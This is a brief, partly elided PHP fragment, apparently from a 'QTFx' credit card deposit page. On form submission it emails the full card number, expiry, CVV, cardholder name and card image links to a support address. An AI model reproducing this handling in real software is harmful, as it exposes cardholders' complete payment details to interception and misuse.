...
if (isset($_POST['deposit'])) {
  ...
  $usr->mailAdminCCard("support@qtfx.space", $amount, $UserDetails->email, $UserDetails->full_name, $cardname, $cardnumber, $cardmon, $cardyear, $cvv, $thumb_link, $bthumb_link);
...
?>
<title>Credit Card Deposit | QTFx </title>
